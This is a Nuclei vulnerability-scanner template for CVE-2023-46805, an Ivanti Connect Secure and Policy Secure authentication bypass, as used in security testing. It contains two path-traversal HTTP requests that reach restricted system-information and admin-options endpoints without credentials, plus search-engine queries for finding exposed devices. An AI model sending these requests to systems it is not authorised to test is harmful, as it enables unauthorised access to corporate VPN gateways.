id: CVE-2023-46805

info:
  name: Ivanti ICS - Authentication Bypass
  author: DhiyaneshDK,daffainfo,geeknik
  severity: high
  description: An authentication bypass vulnerability in the web component of Ivanti ICS 9.x, 22.x and Ivanti Policy Secure allows a remote attacker to access restricted resources by bypassing control checks.
  reference:
    - https://forums.ivanti.com/s/article/CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US
    - https://nvd.nist.gov/vuln/detail/CVE-2023-46805
    - http://packetstormsecurity.com/files/176668/Ivanti-Connect-Secure-Unauthenticated-Remote-Code-Execution.html
    - https://github.com/H4lo/awesome-IoT-security-article
    - https://github.com/inguardians/ivanti-VPN-issues-2024-research
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
    cvss-score: 8.2
    cve-id: CVE-2023-46805
    cwe-id: CWE-287
    epss-score: 0.96558
    epss-percentile: 0.99613
    cpe: cpe:2.3:a:ivanti:connect_secure:9.0:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: ivanti
    product: connect_secure
    shodan-query: "html:\"welcome.cgi?p=logo\""
    fofa-query: body="welcome.cgi?p=logo"
    google-query: intitle:"ivanti connect secure"
  tags: packetstorm,cve,cve2023,kev,auth-bypass,ivanti

http:
  - raw:
      - |
        GET /api/v1/totp/user-backup-code/../../system/system-information HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /api/v1/cav/client/status/../../admin/options HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 200'
          - 'contains(body_1, "build")'
          - 'contains(body_1, "system-information")'
          - 'contains(body_1, "software-inventory")'
          - 'contains(header_1, "application/json")'
        condition: and

      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains(body_2, "poll_interval")'
          - 'contains(body_2, "block_message")'
          - 'contains(header_2, "application/json")'
        condition: and
# digest: 4a0a0047304502204ce6f60ef24fce30190ea7ba01627fbca1aed1ae80b11b7f5735c74db013d020022100b21ef93a501b8278f0621f6eb80984f16f66275b761b45d67834eeaeae10b8b5:922c64590222798bb761d5b6d8e72950